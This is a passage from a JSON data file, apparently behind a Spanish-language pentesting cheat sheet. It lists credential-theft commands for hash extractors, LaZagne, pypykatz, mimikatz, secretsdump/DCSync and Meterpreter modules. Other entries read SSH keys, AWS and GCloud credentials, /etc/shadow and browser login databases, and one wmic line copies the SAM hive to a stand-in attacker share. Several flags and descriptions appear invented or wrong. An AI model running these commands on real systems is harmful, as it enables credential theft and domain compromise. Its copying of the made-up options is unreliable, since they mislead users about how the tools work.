    "cmd": "wlan2john captura.cap",
    "desc": "Convertir"
   },
   {
    "cmd": "wlan2john -a captura.cap",
    "desc": "Todos los paquetes"
   },
   {
    "cmd": "wlan2john -p captura.cap",
    "desc": "PMKID"
   },
   {
    "cmd": "wlan2john -e ESSID captura.cap",
    "desc": "Filtrar ESSID"
   },
   {
    "cmd": "wlan2john -b BSSID captura.cap",
    "desc": "Filtrar BSSID"
   },
   {
    "cmd": "wlan2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "gpg2john",
  "desc": "Extraer hash de claves GPG",
  "commands": [
   {
    "cmd": "gpg2john key.asc",
    "desc": "Hash key"
   },
   {
    "cmd": "gpg2john -k key.gpg",
    "desc": "Keyring"
   },
   {
    "cmd": "gpg2john -o out.txt key.asc",
    "desc": "Salida"
   },
   {
    "cmd": "gpg2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ssh2john",
  "desc": "Extraer hash de claves SSH privadas",
  "commands": [
   {
    "cmd": "ssh2john id_rsa",
    "desc": "Hash key privada"
   },
   {
    "cmd": "ssh2john -f id_rsa",
    "desc": "Fuerza"
   },
   {
    "cmd": "ssh2john -o out.txt id_rsa",
    "desc": "Salida"
   },
   {
    "cmd": "ssh2john -p id_rsa",
    "desc": "Passphrase"
   },
   {
    "cmd": "ssh2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "pdf2john",
  "desc": "Extraer hash de PDFs protegidos",
  "commands": [
   {
    "cmd": "pdf2john documento.pdf",
    "desc": "Hash pdf"
   },
   {
    "cmd": "pdf2john -a documento.pdf",
    "desc": "Autodetect"
   },
   {
    "cmd": "pdf2john -o out.txt documento.pdf",
    "desc": "Salida"
   },
   {
    "cmd": "pdf2john -p documento.pdf",
    "desc": "Solo pass"
   },
   {
    "cmd": "pdf2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "lazagne",
  "desc": "Extraer credenciales almacenadas de aplicaciones",
  "commands": [
   {
    "cmd": "lazagne.exe all",
    "desc": "Todas las credenciales"
   },
   {
    "cmd": "lazagne.exe browsers",
    "desc": "Navegadores"
   },
   {
    "cmd": "lazagne.exe wifi",
    "desc": "WiFi"
   },
   {
    "cmd": "lazagne.exe mail",
    "desc": "Correo"
   },
   {
    "cmd": "lazagne.exe windows",
    "desc": "Windows"
   },
   {
    "cmd": "lazagne.exe all -oN",
    "desc": "Salida normal"
   },
   {
    "cmd": "lazagne.exe all -oJ",
    "desc": "JSON"
   },
   {
    "cmd": "lazagne.exe all -oA",
    "desc": "Todo formato"
   },
   {
    "cmd": "lazagne.exe all -vv",
    "desc": "Verbose"
   },
   {
    "cmd": "lazagne.exe all -password 'x'",
    "desc": "Con password"
   },
   {
    "cmd": "lazagne.exe --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "firefox-decrypt",
  "desc": "Recuperar credenciales de Firefox",
  "commands": [
   {
    "cmd": "firefox_decrypt.py",
    "desc": "Perfil por defecto"
   },
   {
    "cmd": "firefox_decrypt.py -n",
    "desc": "Sin resolución"
   },
   {
    "cmd": "firefox_decrypt.py -c",
    "desc": "Con colores"
   },
   {
    "cmd": "firefox_decrypt.py -v",
    "desc": "Verbose"
   },
   {
    "cmd": "firefox_decrypt.py -d",
    "desc": "Debug"
   },
   {
    "cmd": "firefox_decrypt.py -r",
    "desc": "Reveal"
   },
   {
    "cmd": "firefox_decrypt.py -l",
    "desc": "Listar perfiles"
   },
   {
    "cmd": "firefox_decrypt.py -f /tmp/perfil",
    "desc": "Perfil específico"
   },
   {
    "cmd": "firefox_decrypt.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dumpzilla",
  "desc": "Dump de datos de Firefox (cookies, logins, history)",
  "commands": [
   {
    "cmd": "dumpzilla.py /root/.mozilla/firefox/xyz.default",
    "desc": "Dump completo"
   },
   {
    "cmd": "dumpzilla.py perfil -c",
    "desc": "Cookies"
   },
   {
    "cmd": "dumpzilla.py perfil -l",
    "desc": "Logins"
   },
   {
    "cmd": "dumpzilla.py perfil -h",
    "desc": "History"
   },
   {
    "cmd": "dumpzilla.py perfil -f",
    "desc": "Formularios"
   },
   {
    "cmd": "dumpzilla.py perfil -d",
    "desc": "Descargas"
   },
   {
    "cmd": "dumpzilla.py perfil -p",
    "desc": "Prefs"
   },
   {
    "cmd": "dumpzilla.py perfil -s",
    "desc": "Session"
   },
   {
    "cmd": "dumpzilla.py perfil -a",
    "desc": "Todo"
   },
   {
    "cmd": "dumpzilla.py perfil -j",
    "desc": "JSON"
   }
  ]
 },
 {
  "tool": "keychaindump",
  "desc": "Dump de keychain de macOS",
  "commands": [
   {
    "cmd": "keychaindump",
    "desc": "Buscar en memoria"
   },
   {
    "cmd": "keychaindump -p PID",
    "desc": "PID"
   },
   {
    "cmd": "keychaindump -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "vncpasswd",
  "desc": "Crackear password de VNC",
  "commands": [
   {
    "cmd": "vncpasswd crack hash.bin",
    "desc": "Crackear"
   },
   {
    "cmd": "vncpasswd -v hash.bin",
    "desc": "Verbose"
   },
   {
    "cmd": "vncpasswd -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "pypykatz",
  "desc": "Mimikatz en Python puro (LSASS memory parsing)",
  "commands": [
   {
    "cmd": "pypykatz lsa minidump lsass.dmp",
    "desc": "Analizar minidump"
   },
   {
    "cmd": "pypykatz lsa live",
    "desc": "Live system"
   },
   {
    "cmd": "pypykatz lsa minidump lsass.dmp -o out.json",
    "desc": "JSON"
   },
   {
    "cmd": "pypykatz registry --sam SAM --security SECURITY --system SYSTEM",
    "desc": "Registro"
   },
   {
    "cmd": "pypykatz registry --sam SAM --system SYSTEM",
    "desc": "SAM"
   },
   {
    "cmd": "pypykatz pypykatz lsass.dmp",
    "desc": "Alias"
   },
   {
    "cmd": "pypykatz lsa minidump mem.dmp -l",
    "desc": "Log"
   },
   {
    "cmd": "pypykatz -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "pypykatz lsa minidump lsass.dmp -d",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "pwdump",
  "desc": "Dump de hashes LM/NTLM (Windows)",
  "commands": [
   {
    "cmd": "pwdump SAM SECURITY",
    "desc": "Dump"
   },
   {
    "cmd": "pwdump -x SAM",
    "desc": "Extra"
   },
   {
    "cmd": "pwdump -d SAM",
    "desc": "Dump completo"
   },
   {
    "cmd": "pwdump -l SAM",
    "desc": "Log"
   },
   {
    "cmd": "pwdump -v SAM",
    "desc": "Verbose"
   },
   {
    "cmd": "pwdump -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wce",
  "desc": "Windows Credentials Editor (extraer credenciales)",
  "commands": [
   {
    "cmd": "wce.exe -w",
    "desc": "Dump WDigest"
   },
   {
    "cmd": "wce.exe -l",
    "desc": "Logon sessions"
   },
   {
    "cmd": "wce.exe -s",
    "desc": "Secrets"
   },
   {
    "cmd": "wce.exe -d",
    "desc": "Dump"
   },
   {
    "cmd": "wce.exe -r",
    "desc": "Register"
   },
   {
    "cmd": "wce.exe -c user",
    "desc": "Con user"
   },
   {
    "cmd": "wce.exe -i",
    "desc": "Interactive"
   },
   {
    "cmd": "wce.exe -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "wce.exe -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "fgdump",
  "desc": "Dump de hashes (dumping local auth)",
  "commands": [
   {
    "cmd": "fgdump.exe",
    "desc": "Dump"
   },
   {
    "cmd": "fgdump.exe -c",
    "desc": "Sin cache"
   },
   {
    "cmd": "fgdump.exe -n",
    "desc": "Sin persistencia"
   },
   {
    "cmd": "fgdump.exe -t",
    "desc": "Test"
   },
   {
    "cmd": "fgdump.exe -k",
    "desc": "Kill"
   },
   {
    "cmd": "fgdump.exe -v",
    "desc": "Verbose"
   },
   {
    "cmd": "fgdump.exe -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "fgdump.exe -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "meterpreter-creds",
  "desc": "Extraer credenciales vía Meterpreter",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/credentials/windows_autologin; set SESSION 1; run'",
    "desc": "AutoLogon"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/cachedump; set SESSION 1; run'",
    "desc": "Cache dump"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/lsa_secrets; set SESSION 1; run'",
    "desc": "LSA secrets"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/smart_hashdump; set SESSION 1; run'",
    "desc": "Hashdump"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/credentials/credential_collector; set SESSION 1; run'",
    "desc": "Cred collector"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/gather/wlan_geolocate; set SESSION 1; run'",
    "desc": "WiFi geolocate"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/credentials/toutatis; set SESSION 1; run'",
    "desc": "Toutatis"
   },
   {
    "cmd": "msfconsole -q -x 'use post/windows/gather/credentials/xshell_agent_creds; set SESSION 1; run'",
    "desc": "XShell"
   }
  ]
 },
 {
  "tool": "wifi-creds",
  "desc": "Recuperar credenciales WiFi guardadas",
  "commands": [
   {
    "cmd": "netsh wlan show profiles",
    "desc": "Perfiles"
   },
   {
    "cmd": "netsh wlan show profile SSID key=clear",
    "desc": "Clave en claro"
   },
   {
    "cmd": "for /f 'skip=9 tokens=1,2 delims=:' %i in ('netsh wlan show profiles') do @echo %j",
    "desc": "Todos"
   },
   {
    "cmd": "powershell -c '(netsh wlan show profiles) | Select-String \":\\s\"'",
    "desc": "PS perfiles"
   },
   {
    "cmd": "powershell -c 'Get-WmiObject -Class Win32_NetworkAdapter'",
    "desc": "Adaptadores"
   },
   {
    "cmd": "cat /etc/NetworkManager/system-connections/*",
    "desc": "Linux NM"
   },
   {
    "cmd": "grep -r 'psk=' /etc/NetworkManager/",
    "desc": "PSK Linux"
   },
   {
    "cmd": "wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf -D nl80211",
    "desc": "Supplicant"
   },
   {
    "cmd": "nmcli -s connection show",
    "desc": "Conexiones"
   },
   {
    "cmd": "security dump-keychain | grep -A5 'AirPort'",
    "desc": "macOS"
   }
  ]
 },
 {
  "tool": "browser-creds-extra",
  "desc": "Extraer credenciales de navegadores (Linux)",
  "commands": [
   {
    "cmd": "ls ~/.config/google-chrome/Default/Login Data",
    "desc": "Chrome DB"
   },
   {
    "cmd": "strings ~/.config/google-chrome/Default/Login Data | head",
    "desc": "Strings"
   },
   {
    "cmd": "find ~/.mozilla/firefox -name 'logins.json'",
    "desc": "Firefox"
   },
   {
    "cmd": "firefox-decrypt ~/.mozilla/firefox/PROFILE",
    "desc": "Decrypt firefox"
   },
   {
    "cmd": "find ~ -name 'cookies.sqlite' 2>/dev/null",
    "desc": "Cookies"
   },
   {
    "cmd": "python3 -c 'import sqlite3; c=sqlite3.connect(\"/home/u/.config/google-chrome/Default/Login Data\"); print(c.execute(\"select origin_url,username_value from logins\").fetchall())'",
    "desc": "SQLite logins"
   },
   {
    "cmd": "ls ~/.config/brave/Default/ 2>/dev/null",
    "desc": "Brave"
   },
   {
    "cmd": "ls ~/.config/opera/ 2>/dev/null",
    "desc": "Opera"
   },
   {
    "cmd": "grep -r 'password' ~/.config/google-chrome/ 2>/dev/null | head",
    "desc": "Grep chrome"
   },
   {
    "cmd": "find / -name 'Login Data' 2>/dev/null",
    "desc": "Buscar DBs"
   }
  ]
 },
 {
  "tool": "gpg-tools",
  "desc": "Gestionar y atacar GPG",
  "commands": [
   {
    "cmd": "gpg --list-keys",
    "desc": "Claves"
   },
   {
    "cmd": "gpg --export --armor keyid",
    "desc": "Exportar"
   },
   {
    "cmd": "gpg --import public.asc",
    "desc": "Importar"
   },
   {
    "cmd": "gpg --encrypt -r user archivo",
    "desc": "Cifrar"
   },
   {
    "cmd": "gpg --decrypt archivo.gpg",
    "desc": "Descifrar"
   },
   {
    "cmd": "gpg --sign archivo",
    "desc": "Firmar"
   },
   {
    "cmd": "gpg --verify archivo.sig",
    "desc": "Verificar"
   },
   {
    "cmd": "gpg --gen-key",
    "desc": "Generar"
   },
   {
    "cmd": "gpg --delete-secret-keys keyid",
    "desc": "Borrar"
   },
   {
    "cmd": "john gpg_key --format=gpg",
    "desc": "Crackear con john"
   },
   {
    "cmd": "gpg2john gpg_key > hash.txt",
    "desc": "Convertir hash"
   },
   {
    "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    "desc": "Crack"
   },
   {
    "cmd": "gpg --decrypt --batch --passphrase pass archivo.gpg",
    "desc": "Passphrase"
   }
  ]
 },
 {
  "tool": "zip-archive-crack",
  "desc": "Atacar archivos comprimidos cifrados",
  "commands": [
   {
    "cmd": "zip2john file.zip > hash.txt",
    "desc": "Zip hash"
   },
   {
    "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    "desc": "Crack zip"
   },
   {
    "cmd": "7z2john file.7z > hash.txt",
    "desc": "7z hash"
   },
   {
    "cmd": "rar2john file.rar > hash.txt",
    "desc": "Rar hash"
   },
   {
    "cmd": "john --format=zip hash.txt",
    "desc": "Formato zip"
   },
   {
    "cmd": "fcrackzip -D -p rockyou.txt file.zip",
    "desc": "fcrackzip"
   },
   {
    "cmd": "fcrackzip -u -D -p wordlist file.zip",
    "desc": "Unzip test"
   },
   {
    "cmd": "zipinfo file.zip",
    "desc": "Ver contenido"
   },
   {
    "cmd": "unzip -P pass file.zip",
    "desc": "Descomprimir con pass"
   },
   {
    "cmd": "7z x -p pass file.7z",
    "desc": "7z con pass"
   },
   {
    "cmd": "john --show hash.txt",
    "desc": "Mostrar crackeado"
   },
   {
    "cmd": "john --incremental hash.txt",
    "desc": "Incremental"
   }
  ]
 },
 {
  "tool": "windows-lsa-extra",
  "desc": "Acceso a credenciales Windows (LSA, SAM, NTDS)",
  "commands": [
   {
    "cmd": "reg save HKLM\\SAM /tmp/sam && reg save HKLM\\SYSTEM /tmp/system",
    "desc": "Guardar SAM"
   },
   {
    "cmd": "secretsdump.py -sam sam -system system LOCAL",
    "desc": "Dump SAM"
   },
   {
    "cmd": "secretsdump.py DOMAIN/user:pass@IP",
    "desc": "Dump remoto"
   },
   {
    "cmd": "secretsdump.py -ntds ntds.dit -system system LOCAL",
    "desc": "Dump NTDS"
   },
   {
    "cmd": "vssadmin create shadow /for=C:",
    "desc": "Shadow copy"
   },
   {
    "cmd": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\ntds.dit",
    "desc": "Copiar NTDS"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --ntds",
    "desc": "NTDS via CME"
   },
   {
    "cmd": "crackmapexec smb IP -u user -p pass --sam",
    "desc": "SAM via CME"
   },
   {
    "cmd": "wmic process call create 'cmd /c copy C:\\Windows\\repair\\SAM \\\\attacker\\share\\'",
    "desc": "Copiar SAM"
   },
   {
    "cmd": "mimikatz# lsadump::sam",
    "desc": "Lsadump"
   },
   {
    "cmd": "mimikatz# lsadump::dcsync /domain:dom.local /user:Administrator",
    "desc": "DCSync"
   },
   {
    "cmd": "mimikatz# lsadump::cache",
    "desc": "Cache"
   },
   {
    "cmd": "mimikatz# sekurlsa::wdigest",
    "desc": "Wdigest"
   },
   {
    "cmd": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa | findstr DisableRestrictedAdmin",
    "desc": "Restricted admin"
   }
  ]
 },
 {
  "tool": "password-analysis",
  "desc": "Análisis de políticas de contraseñas",
  "commands": [
   {
    "cmd": "chage -l root",
    "desc": "Política root"
   },
   {
    "cmd": "grep PASS_MAX_DAYS /etc/login.defs",
    "desc": "Max days"
   },
   {
    "cmd": "grep PASS_MIN_LEN /etc/login.defs",
    "desc": "Min len"
   },
   {
    "cmd": "cat /etc/pam.d/common-password | grep -v '^#'",
    "desc": "PAM password"
   },
   {
    "cmd": "chage -M 99999 user",
    "desc": "Sin expiración"
   },
   {
    "cmd": "chage -m 0 user",
    "desc": "Min 0"
   },
   {
    "cmd": "chage -d 0 user",
    "desc": "Expirar ahora"
   },
   {
    "cmd": "passwd -l user",
    "desc": "Bloquear"
   },
   {
    "cmd": "passwd -u user",
    "desc": "Desbloquear"
   },
   {
    "cmd": "passwd -S user",
    "desc": "Estado"
   },
   {
    "cmd": "sudo -l | grep passwd",
    "desc": "Permisos passwd"
   },
   {
    "cmd": "ls /etc/shadow*",
    "desc": "Backups shadow"
   },
   {
    "cmd": "cat /etc/shadow | cut -d: -f1-2",
    "desc": "Hashes shadow"
   },
   {
    "cmd": "cat /etc/passwd | grep ':0:'",
    "desc": "UID 0"
   }
  ]
 },
 {
  "tool": "hashcat-rules",
  "desc": "Cracking avanzado con reglas de hashcat",
  "commands": [
   {
    "cmd": "hashcat -m 0 -a 0 hash.txt rockyou.txt",
    "desc": "MD5 wordlist"
   },
   {
    "cmd": "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
    "desc": "NTLM"
   },
   {
    "cmd": "hashcat -m 1800 -a 0 hash.txt rockyou.txt",
    "desc": "sha512crypt"
   },
   {
    "cmd": "hashcat -m 13100 -a 0 hash.txt rockyou.txt",
    "desc": "Kerberoast"
   },
   {
    "cmd": "hashcat -m 5600 -a 0 hash.txt rockyou.txt",
    "desc": "NetNTLMv2"
   },
   {
    "cmd": "hashcat -m 3200 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
    "desc": "Reglas"
   },
   {
    "cmd": "hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d?d",
    "desc": "Mask attack"
   },
   {
    "cmd": "hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?d?d?d?d",
    "desc": "Brute mask"
   },
   {
    "cmd": "hashcat -m 1000 -a 1 hash.txt dict1.txt dict2.txt",
    "desc": "Combinator"
   },
   {
    "cmd": "hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/d3ad0ne.rule",
    "desc": "D3ad0ne"
   },
   {
    "cmd": "hashcat -m 22000 hash.hc22000 rockyou.txt",
    "desc": "WPA"
   },
   {
    "cmd": "hashcat -m 13100 hash.txt rockyou.txt --show",
    "desc": "Mostrar"
   },
   {
    "cmd": "hashcat -m 1000 hash.txt rockyou.txt -O",
    "desc": "Optimizado"
   },
   {
    "cmd": "hashcat -m 1000 hash.txt rockyou.txt -w 3",
    "desc": "Workload 3"
   },
   {
    "cmd": "hashcat -m 1000 hash.txt rockyou.txt --potfile-path /tmp/pot",
    "desc": "Potfile"
   },
   {
    "cmd": "hashcat --example-hashes -m 1000",
    "desc": "Ejemplos"
   },
   {
    "cmd": "hashcat --identify hash.txt",
    "desc": "Identificar"
   },
   {
    "cmd": "hashcat --show -m 1000 hash.txt",
    "desc": "Recuperados"
   }
  ]
 },
 {
  "tool": "keychain-tools",
  "desc": "Recuperación de credenciales (keychains, keepass)",
  "commands": [
   {
    "cmd": "security find-generic-password -s servicio -w",
    "desc": "Keychain macOS"
   },
   {
    "cmd": "security dump-keychain -d login.keychain",
    "desc": "Dump keychain"
   },
   {
    "cmd": "security find-internet-password -s host -w",
    "desc": "Internet pass"
   },
   {
    "cmd": "kpcli --kdb /tmp/db.kdbx",
    "desc": "KeePass CLI"
   },
   {
    "cmd": "kpcli> ls /",
    "desc": "Listar keepass"
   },
   {
    "cmd": "kpcli> show -f /entry",
    "desc": "Mostrar"
   },
   {
    "cmd": "keepass2john /tmp/db.kdbx > hash.txt",
    "desc": "Hash keepass"
   },
   {
    "cmd": "john --format=keepass hash.txt rockyou.txt",
    "desc": "Crack"
   },
   {
    "cmd": "python3 -c 'import keyring; print(keyring.get_password(\"svc\", \"user\"))'",
    "desc": "Py keyring"
   },
   {
    "cmd": "ls ~/.local/share/keyrings/",
    "desc": "Keyrings"
   },
   {
    "cmd": "cat ~/.local/share/keyrings/Default_keyring.keyring",
    "desc": "Ver"
   },
   {
    "cmd": "grep -r 'password=' ~/.config/ 2>/dev/null | head",
    "desc": "Grep configs"
   },
   {
    "cmd": "secret-tool lookup service x",
    "desc": "Secret tool"
   },
   {
    "cmd": "python3 -c 'import gi; gi.require_version(\"Secret\",\"1\")'",
    "desc": "Py secret"
   }
  ]
 },
 {
  "tool": "token-theft",
  "desc": "Robo de tokens y tickets",
  "commands": [
   {
    "cmd": "find / -name '*.pem' -o -name 'id_rsa' 2>/dev/null | grep -v usr | head",
    "desc": "Claves SSH"
   },
   {
    "cmd": "ls -la ~/.ssh/",
    "desc": "SSH dir"
   },
   {
    "cmd": "cat ~/.ssh/id_rsa",
    "desc": "Clave privada"
   },
   {
    "cmd": "find / -name '*.tok*' -o -name '*token*' 2>/dev/null | grep -iv share | head",
    "desc": "Tokens"
   },
   {
    "cmd": "grep -r 'token\\|api[_-]key' ~/.bash_history 2>/dev/null",
    "desc": "History tokens"
   },
   {
    "cmd": "python3 -c 'import json; print(json.load(open(\"/root/.aws/credentials\")))' 2>/dev/null",
    "desc": "AWS creds"
   },
   {
    "cmd": "cat ~/.aws/credentials 2>/dev/null",
    "desc": "AWS"
   },
   {
    "cmd": "cat ~/.config/gcloud/credentials.db 2>/dev/null",
    "desc": "GCloud"
   },
   {
    "cmd": "klist",
    "desc": "Kerberos"
   },
   {
    "cmd": "grep -r 'session' /tmp/*.txt 2>/dev/null",
    "desc": "Sesiones"
   },
   {
    "cmd": "strings /proc/PID/environ 2>/dev/null | grep -i token",
    "desc": "Env tokens"
   },
   {
    "cmd": "grep -r 'Bearer ' /var/log/ 2>/dev/null | head",
    "desc": "Bearer en logs"
   },
   {
    "cmd": "meterpreter> steal_token PID",
    "desc": "Steal token"
   },
   {
    "cmd": "meterpreter> use incognito; list_tokens -u",
    "desc": "Incognito"
   }
  ]
 }
];
